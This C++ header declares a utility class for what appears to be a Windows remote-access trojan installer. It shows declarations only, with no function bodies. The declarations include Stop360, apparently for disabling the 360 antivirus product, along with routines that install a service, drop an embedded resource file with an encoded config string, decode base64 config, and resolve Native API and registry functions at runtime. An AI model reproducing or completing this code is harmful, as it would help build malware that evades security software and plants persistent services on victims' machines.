// MyCommon.h: interface for the MyCommon class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_MYCOMMON_H__C89F6178_5FB7_49D4_9502_76A72FF6101B__INCLUDED_)
#define AFX_MYCOMMON_H__C89F6178_5FB7_49D4_9502_76A72FF6101B__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include <Tlhelp32.h>
#include <iphlpapi.h>
#include <winsock2.h>
#include <WinIoCtl.h>
#include <stdlib.h>
#include <ntapi.h>
#include "../Public.h"

#define	MAX_CONFIG_LEN	1024

typedef	DWORD	(__stdcall *pGetInterfaceInfo)(PIP_INTERFACE_INFO,PULONG);
typedef	DWORD	(__stdcall *pAddIPAddress)(IPAddr,IPMask,DWORD,PULONG,PULONG);
typedef	DWORD	(__stdcall *pDeleteIPAddress)( ULONG NTEContext );
typedef CONST char *PCSZ;
typedef void (__stdcall *pRtlInitAnsiString)( PANSI_STRING DestinationString, PCSZ SourceString );
typedef NTSTATUS (__stdcall *pRtlAnsiStringToUnicodeString)( PUNICODE_STRING DestinationString, PCANSI_STRING SourceString, BOOLEAN AllocateDestinationString );
typedef void (__stdcall *pRtlInitUnicodeString)( PUNICODE_STRING DestinationString, WCHAR *SourceString );
typedef NTSTATUS (__stdcall *pRtlUnicodeStringToAnsiString)( PANSI_STRING DestinationString, PUNICODE_STRING SourceString, BOOLEAN AllocateDestinationString );
typedef	ULONG	(__stdcall *pinet_addr)(IN const char FAR * cp);
typedef LONG (WINAPI *BREG_OPEN_KEY)(HKEY hKey, LPCSTR lpSubKey, PHKEY phkResult);
typedef LONG (WINAPI *BREG_CLOSE_KEY)(HKEY hKey);
typedef LONG (WINAPI *REG_SET_VALUE_EX)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE* lpData, DWORD cbData);
typedef BOOL (WINAPI *INIT_REG_ENGINE)();
typedef	DWORD	(__stdcall *pGetModuleFileNameExW)(HANDLE hProcess, HMODULE hModule, LPWSTR lpFilename, DWORD nSize);


class MyCommon  
{
public:
	MyCommon();
	virtual ~MyCommon();
public:
	static	char	EncodeString[MAX_CONFIG_LEN];
	static	char	ServiceConfig[MAX_CONFIG_LEN];
	static	pGetInterfaceInfo MyGetInterfaceInfo;
	static	pAddIPAddress MyAddIPAddress;
	static	pDeleteIPAddress MyDeleteIPAddress;
	static	pRtlInitAnsiString MyRtlInitAnsiString;
	static	pRtlInitUnicodeString MyRtlInitUnicodeString;
	static	pRtlAnsiStringToUnicodeString MyRtlAnsiStringToUnicodeString;
	static	pRtlUnicodeStringToAnsiString MyRtlUnicodeStringToAnsiString;
	static	pinet_addr Myinet_addr;
	static	DWORD	IpContext[1000];
	static	BOOL	GetAddr();
	static	DWORD	GetProAddress( HMODULE phModule,char* pProcName );
	static	DWORD	GetProcessID(TCHAR *lpProcessName);
	static	BOOL	Stop360( char *IPADDR, int i );
	static	LPCTSTR	InstallService(LPCTSTR lpServiceDisplayName, LPCTSTR lpServiceDescription, PCHAR lpConfigString, HWND hWindow );
	static	BOOL	ReleaseResource( WORD wResourceID, LPCTSTR lpType, LPCTSTR lpFileName, PCHAR lpConfigString );
	static	char	base64[100];
	static	int		pos(char c);
	static	int		base64_decode(const char *str, char **data);
	static	char*	MyDecode(char *str);
	static	LPBYTE	FindConfigString( WORD wResourceID, LPCTSTR lpType );
	static	int		memfind(const char *mem, const char *str, int sizem, int sizes);
	static	void	StartService(LPCTSTR lpService);
	static	PWCHAR	ANSI2UNICODE( PCHAR Buf );
	static	PCHAR	UNICODE2ANSI( PWCHAR Buf );
//	static	BOOL	Use360Fun( PTCHAR SubKey, PTCHAR ValueName, PTCHAR Buff );
	static	PTCHAR	ToLower(TCHAR s[]);
};

#endif // !defined(AFX_MYCOMMON_H__C89F6178_5FB7_49D4_9502_76A72FF6101B__INCLUDED_)
